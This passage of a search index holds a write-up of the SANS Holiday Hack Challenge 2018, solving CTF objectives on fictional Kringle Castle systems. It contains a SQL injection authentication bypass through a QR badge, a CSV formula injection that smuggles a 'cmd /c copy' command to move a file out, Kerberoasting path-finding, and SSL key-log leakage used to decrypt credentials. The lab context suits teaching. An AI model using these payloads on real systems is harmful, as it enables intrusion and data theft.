the next attempt starts with the second digit (0 0 0 1), then the third digit (0 0 1 0), and so on until we find a combination that works. The winning combination turns out to be 0 1 2 0 (triangle, square, circle, triangle). Inside the Speaker Unpreparedness Room, Morcel Nougat says Welcome unprepared speaker! Alternatives There are 256 different combinations possible, but fortunately the door unlocks after on the 19th attempt. If the problem were more complicated, manual attempts would not be feasible, so we could try automating the tries. A look at the terminal through the OWASP ZAP proxy reveals that each guess is submitted as a parameter in a HTTP GET request. We could send this request to the fuzzer and try each combination automatically until a successful response is returned. Here we define parameter i as our fuzzing target. This Python program generates the payload list, which we can paste into ZAP as a list of strings. #!/usr/bin/python seq = 0000100020003001100120013002100220023003100320033010102010301110112011301210122012301310132013302020302110212021302210222022302310232023303031103120313032103220323033103320333111121113112211231132113312121312221223123212331313221323133213332222322332323333000 for x in range ( 1 , 256 ): print seq [ x : x + 4 ] Now start the fuzzer and look at the results. We know from our first request that failed attempts result in a 46 byte response from the server; a result of a different length may indicate success. Here we see that the response to request #18 is 142 bytes, unlike the others, and the JSON returned from the server says \"Correct guess!\"","title":"de Bruijn Sequences"},{"location":"Objectives/3-sequence.html#objective-3-de-bruijn-sequences","text":"","title":"Objective #3: de Bruijn Sequences"},{"location":"Objectives/3-sequence.html#problem","text":"When you break into the speaker unpreparedness room, what does Morcel Nougat say? For hints on achieving this objective, please visit Tangle Coalbox and help him with Lethal ForensicELFication Cranberry Pi terminal challenge.","title":"Problem"},{"location":"Objectives/3-sequence.html#hints","text":"Tangle Coalbox provides the following hint: Have you been able to solve the lock with the funny shapes? It reminds me of something called \"de Bruijn Sequences.\" You can optimize the guesses because there is no start and stop -- each new value is added to the end and the first is removed. I've even seen de Bruijn sequence generators online. Here the length of the alphabet is 4 (only 4 buttons) and the length of the PIN is 4 as well. Mathematically this is k=4, n=4 to generate the de Bruijn sequence. Math is like your notepad and pencil - can't leave home without it! Tangle also provides a link to a webpage on how you can open a Ford vehicle with a robot and the de Bruign Sequence https://hackaday.com/2018/06/18/opening-a-ford-with-a-robot-and-the-de-bruijn-sequence/ Tangle also provides a link to a de Bruijn Sequence generator: http://www.hakank.org/comb/debruijn.cgi","title":"Hints"},{"location":"Objectives/3-sequence.html#solution","text":"The challenge is to come up with the correct combination to unlock the door to the Speaker Unpreparedness Room. Visit the sequence generator page that Tangle provided, and enter a value of 4 for both k (alphabet size) and n (word length). This produces the following sequence: 0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 (0 0 0) Now, assign a digit to each of the buttons on the door lock (triangle=0, square=1, circle=2, star=3). The first door password attempt is the first four digits of the sequence (0 0 0 0), the next attempt starts with the second digit (0 0 0 1), then the third digit (0 0 1 0), and so on until we find a combination that works. The winning combination turns out to be 0 1 2 0 (triangle, square, circle, triangle). Inside the Speaker Unpreparedness Room, Morcel Nougat says Welcome unprepared speaker!","title":"Solution"},{"location":"Objectives/3-sequence.html#alternatives","text":"There are 256 different combinations possible, but fortunately the door unlocks after on the 19th attempt. If the problem were more complicated, manual attempts would not be feasible, so we could try automating the tries. A look at the terminal through the OWASP ZAP proxy reveals that each guess is submitted as a parameter in a HTTP GET request. We could send this request to the fuzzer and try each combination automatically until a successful response is returned. Here we define parameter i as our fuzzing target. This Python program generates the payload list, which we can paste into ZAP as a list of strings. #!/usr/bin/python seq = 0000100020003001100120013002100220023003100320033010102010301110112011301210122012301310132013302020302110212021302210222022302310232023303031103120313032103220323033103320333111121113112211231132113312121312221223123212331313221323133213332222322332323333000 for x in range ( 1 , 256 ): print seq [ x : x + 4 ] Now start the fuzzer and look at the results. We know from our first request that failed attempts result in a 46 byte response from the server; a result of a different length may indicate success. Here we see that the response to request #18 is 142 bytes, unlike the others, and the JSON returned from the server says \"Correct guess!\"","title":"Alternatives"},{"location":"Objectives/4-datarepo.html","text":"Objective #4: Data Repo Analysis Problem Retrieve the encrypted ZIP file from the North Pole Git repository https://git.kringlecastle.com/Upatree/santas_castle_automation . What is the password to open this file? For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge. Hints Wunorse Openslae provides the following hints: Speaking of good ways to find credentials, have you heard of Trufflehog? It's a cool way to dig through repositories for passwords, RSA keys, and more. I mean, no one EVER uploads sensitive credentials to public repositories, right? But if they did, this would be a great tool for finding them. But hey, listen to me ramble. If you're interested in Trufflehog, you should check out Brian Hostetler's talk! Have you tried the entropy=True option when running Trufflehog? It is amazing how much deeper it will dig! Wunorse also provides a link to the Trufflehog tool: https://github.com/dxa4481/truffleHog Wunorse also mentions the KringleCon talk by Brian Hostetler called \"Buried Secrets: Digging Deep Through Cloud Repositories\" Solution Download and install trufflehog (easily done with 'pip install trufflehog'), then run it against the repository provided. In the truncated output below, Shiny commited a change to remove the password 'Yippee-ki-yay', but because of versioning control, the history of this file was saved and we were able to retrieve what was once there in a previous version of the file. root@kali:~/hhc18# trufflehog https://git.kringlecastle.com/Upatree/santas_castle_automation ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~ Reason: High Entropy Date: 2018-12-11 02:16:57 Hash: 0dfdc124b43a4e7e1233599c429c0328ec8b01ef Filepath: schematics/for_elf_eyes_only.md Branch: origin/master Commit: important update @@ -1,15 +0,0 @@ -Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference. - -Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did! - - -Hopefully this is the last time we have to change our password again until next Christmas. - - - - -Password = Yippee-ki-yay - - -Change ID = 9ed54617547cfca783e0f81f8dc5c927e3d1e3 - Answer: \"Yippee-ki-yay\"","title":"Data Repo Analysis"},{"location":"Objectives/4-datarepo.html#objective-4-data-repo-analysis","text":"","title":"Objective #4: Data Repo Analysis"},{"location":"Objectives/4-datarepo.html#problem","text":"Retrieve the encrypted ZIP file from the North Pole Git repository https://git.kringlecastle.com/Upatree/santas_castle_automation . What is the password to open this file? For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge.","title":"Problem"},{"location":"Objectives/4-datarepo.html#hints","text":"Wunorse Openslae provides the following hints: Speaking of good ways to find credentials, have you heard of Trufflehog? It's a cool way to dig through repositories for passwords, RSA keys, and more. I mean, no one EVER uploads sensitive credentials to public repositories, right? But if they did, this would be a great tool for finding them. But hey, listen to me ramble. If you're interested in Trufflehog, you should check out Brian Hostetler's talk! Have you tried the entropy=True option when running Trufflehog? It is amazing how much deeper it will dig! Wunorse also provides a link to the Trufflehog tool: https://github.com/dxa4481/truffleHog Wunorse also mentions the KringleCon talk by Brian Hostetler called \"Buried Secrets: Digging Deep Through Cloud Repositories\"","title":"Hints"},{"location":"Objectives/4-datarepo.html#solution","text":"Download and install trufflehog (easily done with 'pip install trufflehog'), then run it against the repository provided. In the truncated output below, Shiny commited a change to remove the password 'Yippee-ki-yay', but because of versioning control, the history of this file was saved and we were able to retrieve what was once there in a previous version of the file. root@kali:~/hhc18# trufflehog https://git.kringlecastle.com/Upatree/santas_castle_automation ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~ Reason: High Entropy Date: 2018-12-11 02:16:57 Hash: 0dfdc124b43a4e7e1233599c429c0328ec8b01ef Filepath: schematics/for_elf_eyes_only.md Branch: origin/master Commit: important update @@ -1,15 +0,0 @@ -Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference. - -Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did! - - -Hopefully this is the last time we have to change our password again until next Christmas. - - - - -Password = Yippee-ki-yay - - -Change ID = 9ed54617547cfca783e0f81f8dc5c927e3d1e3 - Answer: \"Yippee-ki-yay\"","title":"Solution"},{"location":"Objectives/5-adpriv.html","text":"Objective #5: AD Privilege Discovery Problem Using the data set contained in this SANS Slingshot Linux image ( https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova ), find a reliable path from a Kerberoastable user to the Domain Admins group. What\u2019s the user\u2019s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge. Hints Holly Evergreen provides the following hint: Have you ever used Bloodhound for testing Active Directory implementations? It's a merry little tool that can sniff AD and find paths to reaching privileged status on specific machines. AD implementations can get so complicated that administrators may not even know what paths they've set up that attackers might exploit. Have you seen anyone demo the tool before? Holly also provides a link to a Bloodhound demo: https://youtu.be/gOpsLiJFI1o Solution Kerberoasting is a technique that allows us to discover the passwords of often highly-privileged service accounts in Active Directory, using information available to any authenticated domain user. Since Active Directory domains can be quite large, this process can be time-consuming. Bloodhound is a tool that helps focus our efforts by mapping out which accounts are most likely to provide the elevated rights we're looking for. The provided SANS Slingshot Linux virtual machine has Bloodhound pre-installed with data already extracted from an Active Directory domain. Our job is to use the tool to identify an account that gives us the best chances of gaining domain admin rights. Start up the Slingshot image (if it doesn't boot, change the VM settings from 32-bit to 64-bit), then open BloodHound by double-clicking its icon on the desktop. Inside the application, select Queries Shortest Paths to Domain Admins from Kerberoastable Users. Our target will be the user Leanne Dubej (LDUBEJ00320@AD.KRINGLECASTLE.COM). Her account is a member of a group called IT_00332, which has local admin access to a computer named COMP00185. Jen Betak (JBETAK00084@AD.KRINGLECON.COM) is a domain admin, and has a session open on COMP00185. If we can obtain access to COMP00185 using Leanne's account, then we can steal Jen's password hash out of memory and use that to gain domain admin rights. Alternatives There may be an alternate path to domain admin rights. Change the query to \"Shortest Paths from Kerberoastable Users\" from the perspective of LDUBEJ00320. In addition to the path through Jen Betak's account, there's a similar path through Elvin Basque (EBASQUE00032). This doesn't change the answer to the challenge objective, but in a real world scenario it gives the attacker more options to compromise the domain. Answer: LDUBEJ00320@AD.KRINGLECASTLE.COM","title":"AD Privilege Discovery"},{"location":"Objectives/5-adpriv.html#objective-5-ad-privilege-discovery","text":"","title":"Objective #5: AD Privilege Discovery"},{"location":"Objectives/5-adpriv.html#problem","text":"Using the data set contained in this SANS Slingshot Linux image ( https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova ), find a reliable path from a Kerberoastable user to the Domain Admins group. What\u2019s the user\u2019s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.","title":"Problem"},{"location":"Objectives/5-adpriv.html#hints","text":"Holly Evergreen provides the following hint: Have you ever used Bloodhound for testing Active Directory implementations? It's a merry little tool that can sniff AD and find paths to reaching privileged status on specific machines. AD implementations can get so complicated that administrators may not even know what paths they've set up that attackers might exploit. Have you seen anyone demo the tool before? Holly also provides a link to a Bloodhound demo: https://youtu.be/gOpsLiJFI1o","title":"Hints"},{"location":"Objectives/5-adpriv.html#solution","text":"Kerberoasting is a technique that allows us to discover the passwords of often highly-privileged service accounts in Active Directory, using information available to any authenticated domain user. Since Active Directory domains can be quite large, this process can be time-consuming. Bloodhound is a tool that helps focus our efforts by mapping out which accounts are most likely to provide the elevated rights we're looking for. The provided SANS Slingshot Linux virtual machine has Bloodhound pre-installed with data already extracted from an Active Directory domain. Our job is to use the tool to identify an account that gives us the best chances of gaining domain admin rights. Start up the Slingshot image (if it doesn't boot, change the VM settings from 32-bit to 64-bit), then open BloodHound by double-clicking its icon on the desktop. Inside the application, select Queries Shortest Paths to Domain Admins from Kerberoastable Users. Our target will be the user Leanne Dubej (LDUBEJ00320@AD.KRINGLECASTLE.COM). Her account is a member of a group called IT_00332, which has local admin access to a computer named COMP00185. Jen Betak (JBETAK00084@AD.KRINGLECON.COM) is a domain admin, and has a session open on COMP00185. If we can obtain access to COMP00185 using Leanne's account, then we can steal Jen's password hash out of memory and use that to gain domain admin rights.","title":"Solution"},{"location":"Objectives/5-adpriv.html#alternatives","text":"There may be an alternate path to domain admin rights. Change the query to \"Shortest Paths from Kerberoastable Users\" from the perspective of LDUBEJ00320. In addition to the path through Jen Betak's account, there's a similar path through Elvin Basque (EBASQUE00032). This doesn't change the answer to the challenge objective, but in a real world scenario it gives the attacker more options to compromise the domain. Answer: LDUBEJ00320@AD.KRINGLECASTLE.COM","title":"Alternatives"},{"location":"Objectives/6-badge.html","text":"Objective #6: Badge Manipulation Problem Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available . What is the access control number revealed by the door authentication panel? For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge. Hints Pepper Minstix provides the following hint: All of the Kringle Castle employees have these cool cards with QR codes on them that give us access to restricted areas. Unfortunately, the badge-scan-o-matic said my account was disabled when I tried scanning my badge. I really needed access so I tried scanning several QR codes I made from my phone but the scanner kept saying \"User Not Found\". I researched a SQL database error from scanning a QR code with special characters in it and found it may contain an injection vulnerability. I was going to try some variations I found on OWASP but decided to stop so I don't tick-off Alabaster. Pepper Minstix also provides links for a website that generates QR codes https://www.the-qrcode-generator.com/ and a webpage from OWASP about SQL Injection https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass Solution We're presented with a door badge reader that we can interact with by uploading images of QR codes. Using an online QR decoder, we discover that Alabaster's badge decodes to a value of oRfjg5uGHmbduj2m. Since this value is probably handled by some backend database programming, we can test it for an injection flaw. Add a SQL injection string to the original value and encode it into a QR code. oRfjg5uGHmbduj2m -- When it's presented to the Scan-o-matic, here's what happens: EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1\") This input produces an invalid SQL query on the backend that's exposed through the user interface. This is great, because it means less guesswork as to what's needed to create a successful injection string. Let's try to create a valid SQL query: oRfjg5uGHmbduj2m or 1 = 1 Now we get: Authorized User Account Has Been Disabled! So the query is now valid, but the account that it matches it disabled. From the SQL query in the error message above, we can see that there is a column named \"enabled\". Maybe we can alter the SQL query in a way that forces that to a value of true. oRfjg5uGHmbduj2m or 1 = 1 and enabled = 1 Now we're granted access, and can proceed into Santa's secret room: User Access Granted - Control number 19880715 Answer: 19880715","title":"Badge Manipulation"},{"location":"Objectives/6-badge.html#objective-6-badge-manipulation","text":"","title":"Objective #6: Badge Manipulation"},{"location":"Objectives/6-badge.html#problem","text":"Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available . What is the access control number revealed by the door authentication panel? For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge.","title":"Problem"},{"location":"Objectives/6-badge.html#hints","text":"Pepper Minstix provides the following hint: All of the Kringle Castle employees have these cool cards with QR codes on them that give us access to restricted areas. Unfortunately, the badge-scan-o-matic said my account was disabled when I tried scanning my badge. I really needed access so I tried scanning several QR codes I made from my phone but the scanner kept saying \"User Not Found\". I researched a SQL database error from scanning a QR code with special characters in it and found it may contain an injection vulnerability. I was going to try some variations I found on OWASP but decided to stop so I don't tick-off Alabaster. Pepper Minstix also provides links for a website that generates QR codes https://www.the-qrcode-generator.com/ and a webpage from OWASP about SQL Injection https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass","title":"Hints"},{"location":"Objectives/6-badge.html#solution","text":"We're presented with a door badge reader that we can interact with by uploading images of QR codes. Using an online QR decoder, we discover that Alabaster's badge decodes to a value of oRfjg5uGHmbduj2m. Since this value is probably handled by some backend database programming, we can test it for an injection flaw. Add a SQL injection string to the original value and encode it into a QR code. oRfjg5uGHmbduj2m -- When it's presented to the Scan-o-matic, here's what happens: EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1\") This input produces an invalid SQL query on the backend that's exposed through the user interface. This is great, because it means less guesswork as to what's needed to create a successful injection string. Let's try to create a valid SQL query: oRfjg5uGHmbduj2m or 1 = 1 Now we get: Authorized User Account Has Been Disabled! So the query is now valid, but the account that it matches it disabled. From the SQL query in the error message above, we can see that there is a column named \"enabled\". Maybe we can alter the SQL query in a way that forces that to a value of true. oRfjg5uGHmbduj2m or 1 = 1 and enabled = 1 Now we're granted access, and can proceed into Santa's secret room: User Access Granted - Control number 19880715 Answer: 19880715","title":"Solution"},{"location":"Objectives/7-hr.html","text":"Objective #7: HR Incident Response Problem Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website ( https://careers.kringlecastle.com/ ) and fetch the document C:\\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with \"K.\" For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge. Hints Sparkle Redberry provides the following hint: I wonder if Tangle Coalbox has taken a good look at his own employee import system. It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had. I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there. I'm sure the danger can be mitigated. OWASP has guidance on what not to allow with such oploads. Sparkle also provides a link to an OWASP webpage on CSV injection: https://www.owasp.org/index.php/CSV_Injection Sparkle also mentions Brian Hostetler's KringleCon talk called \"CSV Formula Injections: Pwn Web Apps Like a Ninja\" Solution The website contains a form to submit the candidate's biographical information and a work history in csv format. On submitting a sample file, the website returns the message: Thank you for taking the time to upload your information to our elf resources shared workshop station! Our elf resources will review your CSV work history within the next few minutes to see if you qualify to join our elite team of InfoSec Elves. If you are accepted, you will be added to our secret list of potential new elf hires located in C:\\candidate_evaluation.docx So clearly, we're meant to somehow download the docx file. It's important not to rush in and launch fancy exploits before doing some basic website recon, as we might miss some important details. Sure enough, there is an interesting 404 error that suggests a method of exfiltrating the file from the server: 404 Error! Publicly accessible file served from: C:\\careerportal\\resources\\public\\ not found...... Try: https://careers.kringlecastle.com/public/'file name you are looking for' This probably means that we should copy the file C:\\candidate_evaluation.docx to C:\\careerportal\\resources\\public\\, and then download it from URL https://careers.kringlecastle.com/public/candidate_evaluation.docx. Using tips from the KringleCon talk, construct a CSV file containing an appropriate OS command. Note: I'm not going to use the original file name, as that could spoil the adventure for other Holiday Hackers who might be looking at that URL for the file. FirstName,LastName,Phone,Email =cmd| /c copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\foobar.docx !A1,Nobody,2345678901,nobody@nowhere.com Upon submitting the CSV file, we can browse to https://careers.kringlecastle.com/public/foobar.docx and download the docx file. It contains information on an applicant named \"Krampus\" who worked with the terrorist organization \"Fancy Beaver\". Some of the elves are listed in the file, including Alabaster. Elf Resources notated a recommendation that he be granted access to Santa's Secret Room. This information may come in handy later on. Answer: Fancy Beaver","title":"HR Incident Response"},{"location":"Objectives/7-hr.html#objective-7-hr-incident-response","text":"","title":"Objective #7: HR Incident Response"},{"location":"Objectives/7-hr.html#problem","text":"Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website ( https://careers.kringlecastle.com/ ) and fetch the document C:\\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with \"K.\" For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.","title":"Problem"},{"location":"Objectives/7-hr.html#hints","text":"Sparkle Redberry provides the following hint: I wonder if Tangle Coalbox has taken a good look at his own employee import system. It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had. I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there. I'm sure the danger can be mitigated. OWASP has guidance on what not to allow with such oploads. Sparkle also provides a link to an OWASP webpage on CSV injection: https://www.owasp.org/index.php/CSV_Injection Sparkle also mentions Brian Hostetler's KringleCon talk called \"CSV Formula Injections: Pwn Web Apps Like a Ninja\"","title":"Hints"},{"location":"Objectives/7-hr.html#solution","text":"The website contains a form to submit the candidate's biographical information and a work history in csv format. On submitting a sample file, the website returns the message: Thank you for taking the time to upload your information to our elf resources shared workshop station! Our elf resources will review your CSV work history within the next few minutes to see if you qualify to join our elite team of InfoSec Elves. If you are accepted, you will be added to our secret list of potential new elf hires located in C:\\candidate_evaluation.docx So clearly, we're meant to somehow download the docx file. It's important not to rush in and launch fancy exploits before doing some basic website recon, as we might miss some important details. Sure enough, there is an interesting 404 error that suggests a method of exfiltrating the file from the server: 404 Error! Publicly accessible file served from: C:\\careerportal\\resources\\public\\ not found...... Try: https://careers.kringlecastle.com/public/'file name you are looking for' This probably means that we should copy the file C:\\candidate_evaluation.docx to C:\\careerportal\\resources\\public\\, and then download it from URL https://careers.kringlecastle.com/public/candidate_evaluation.docx. Using tips from the KringleCon talk, construct a CSV file containing an appropriate OS command. Note: I'm not going to use the original file name, as that could spoil the adventure for other Holiday Hackers who might be looking at that URL for the file. FirstName,LastName,Phone,Email =cmd| /c copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\foobar.docx !A1,Nobody,2345678901,nobody@nowhere.com Upon submitting the CSV file, we can browse to https://careers.kringlecastle.com/public/foobar.docx and download the docx file. It contains information on an applicant named \"Krampus\" who worked with the terrorist organization \"Fancy Beaver\". Some of the elves are listed in the file, including Alabaster. Elf Resources notated a recommendation that he be granted access to Santa's Secret Room. This information may come in handy later on. Answer: Fancy Beaver","title":"Solution"},{"location":"Objectives/8-packalyzer.html","text":"Objective #8: Network Traffic Forensics Problem Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge. Hints After solving the Python Escape from LA terminal, SugarPlum Mary provides these hints: Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root. Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code. There was suspicious-looking development code using environment variables to store SSL keys and open up directories. This elf then told me that manipulating values in the URL gave back weird and descriptive errors. I'm hoping these errors can't be used to compromise SSL on the website and steal logins. On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different! SugarPlum must really want us to attend the KringleCon talk by Chris Elgee and Chris Davis called \"HTTP/2 - Because 1 is the Loneliest Number\", because she mentions it not once, but twice! Solution Finding nothing noteworthy about the logon page source code, I create an account and log into the webpage. I'm able to create a packet capture, but it's all encrypted traffic on port 443. Looking over the webpage source, I find the following comment that suggests that there is some server side code in app.js. //File upload Function. All extensions and sizes are validated server-side in app.js My initial attempt at loading https://packalyzer.kringlecastle.com/app.js fails with a Not Found error. Then I notice that images and CSS are being loaded out of the /pub directory, so I try https://packalyzer.kringlecastle.com/pub/app.js , and get a page full of Javascript back. I spend some time reading over the code, trying to determine what it does, and a few things stand out. const dev_mode = true; It seems the developers have left some development mode features enabled. Developers will often put special routines in their programs to help with testing and troubleshooting. These are supposed to be removed before pushing code to production, since they usually involve dangerous activities like bypassing security checks or exposing sensitive variables in the user interface. I save a copy of the .js file and search to see where dev_mode is referenced. C:\\hhc18 curl.exe -s -o app.js https://packalyzer.kringlecastle.com/pub/app.js C:\\hhc18 type app.js | find /n dev_mode [26]const dev_mode = true; [27]const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.en v.SSLKEYLOGFILE ) [86]if (dev_mode) { In the block of code starting on line 86, a list of allowed directories is defined. Under normal conditions, users should only be able to access paths that begin with /pub/ and /uploads/, but with dev_mode enabled, any directory with the same name as an environment variable key will be permitted. If we can figure out what some of the environment variables are being used, we might be able to find something that the developer didn't intend for us to access. if (dev_mode) { //Can set env variable to open up directories during dev const env_dirs = load_envs(); } else { const env_dirs = [ /pub/ , /uploads/ ]; } This line hints that DEV and SSLKEYLOGFILE are environment variables, so those paths should be open to us. const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE ) Let's see what happens when we visit those URL's: C:\\hhc18 curl https://packalyzer.kringlecastle.com/sslkeylogfile/ Error: ENOENT: no such file or directory, open /opt/http2packalyzer_clientrandom_ssl.log/ C:\\hhc18 https://packalyzer.kringlecastle.com/dev/ Error: EISDIR: illegal operation on a directory, read From this, I'd have to deduce that ssl key log filename is packalyzer_clientrandom_ssl.log, and a /dev directory exists. Let's put those two things together: C:\\hhc18 curl -s https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log CLIENT_RANDOM 6C9AE5A23560F05E825A4B90F38F93DD6540C8D2EEB35ACC78CE0CFF40933DFA FAF08DD05340CDD46CC1745FEC3223FF9C4E4416861384AD2B2BF957DF7D671FEBB12ADC18B3BA41C183E943B482C352 CLIENT_RANDOM C1E4FD63396F6464220AE6488C01052EC0FF04A3273F905D398BB6AE1A2B2034 151F2960D6C9E9AD2855F0B22A85155D13C073ED34C5F3CF5FB5040F90F5662022A40558DD702F2B115A92668CE7268B CLIENT_RANDOM D94A8791854038E608243FC4EB27FB2CBE40A5C315929CBDC58881E0D8683F9F EE4082BEFAB006A5F5190F84BA62342E471F0C9139D3AF83D0011C19EEED96EB52BF0ED90AA5DEE1EC5AE4955F6D6967 CLIENT_RANDOM 4CFA5920FE0064A72AA754982567D09A56760D54912B8E10A967C7E9388DD189 9F18407AFACB57DB96325941BB25806ECF528D8DA915BC633B5A2D3738257C48B81994B0F560E5DEEAE8D71346343EA1 CLIENT_RANDOM 65E4B65F3C16CA2BC684D69FDFAEE53F72C795A12F32CE45202ED1BA9AD5E5EA F05717723276263EFC62BEAE10B157650D4C36327CB4197A95B458792B2189D0FE7C8798ED2B2CCA7836A8BA6EF14277 truncated Now we know where to obtain the ssl key log file from, but before downloading it, we need to run another packet capture. Note It's important to download the files in the right order. Each web connection is assigned a unique key to encrypt its data. Therefore, the ssl keys we need don't exist until the connections have been made. The encrypted data and the specific key that encrypted that data both have to be loaded into Wireshark for this to work. With both the packet capture and the ssl key log file downloaded, we can load these into Wireshark and view the unencrypted contents of the http2 packets. The ssl key log file goes into protocol preferences for ssl as shown here: The following credentials were found while analyzing the http2 data packets: Username Password alabaster Packer-p@re-turntable192 pepper Shiz-Bamer_wabl182 bushy Floppity_Floopy-flab19283 Alabaster is an admin, so let's try logging on as him first. I find that there's a saved packet capture in his account that is named \"super_secret_packet_capture.pcap\". Download and inspect this pcap in Wireshark, and you'll find an smtp mail transmission that contains a base64 encoded file attachment. 220 mail.kringlecastle.com ESMTP Postfix (Ubuntu) EHLO Mail.kringlecastle.com 250-mail.kringlecastle.com 250-PIPELINING 250-SIZE 10240000 250-VRFY 250-ETRN 250-STARTTLS 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN MAIL FROM: Holly.evergreen@mail.kringlecastle.com 250 2.1.0 Ok RCPT TO: alabaster.snowball@mail.kringlecastle.com 250 2.1.5 Ok DATA 354 End data with CR LF . CR LF Date: Fri, 28 Sep 2018 11:33:17 -0400 To: alabaster.snowball@mail.kringlecastle.com From: Holly.evergreen@mail.kringlecastle.com Subject: test Fri, 28 Sep 2018 11:33:17 -0400 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary= ----=_MIME_BOUNDARY_000_11181 ------=_MIME_BOUNDARY_000_11181 Content-Type: text/plain Hey alabaster, Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music. ------=_MIME_BOUNDARY_000_11181 Content-Type: application/octet-stream Content-Transfer-Encoding: BASE64 Content-Disposition: attachment JVBERi0xLjUKJb/3ov4KOCAwIG9iago8PCAvTGluZWFyaXplZCAxIC9MIDk3ODMxIC9IIFsgNzM4 IDE0MCBdIC9PIDEyIC9FIDc3MzQ0IC9OIDIgL1QgOTc1MTcgPj4KZW5kb2JqCiAgICAgICAgICAg snip ZDIwYjI1MmU0OWRiPl0gPj4Kc3RyZWFtCnicY2IAASZGRj0FBiYg6yiIZP8OIiWngUhGNRCpIw5m 2zMAAFMTA30KZW5kc3RyZWFtCmVuZG9iagogICAgICAgICAgICAgICAgICAgICAgICAgICAgIApz dGFydHhyZWYKMjE2CiUlRU9GCg== ------=_MIME_BOUNDARY_000_11181-- . 250 2.0.0 Ok: queued as 4CF931B5C3C0 QUIT 221 2.0.0 Bye Use a base64 to binary file converter, like the one at https://www.motobit.com/util/base64-decoder-encoder.asp to produce a file. Since the filename is mysteriously missing from the transmission, I use the file command in my bash shell to check the file type and discover that it is a PDF. $ file smtp.pdf smtp.pdf: PDF document, version 1 .5 Answer: Mary Had a Little Lamb","title":"Network Traffic Forensics"},{"location":"Objectives/8-packalyzer.html#objective-8-network-traffic-forensics","text":"","title":"Objective #8: Network Traffic 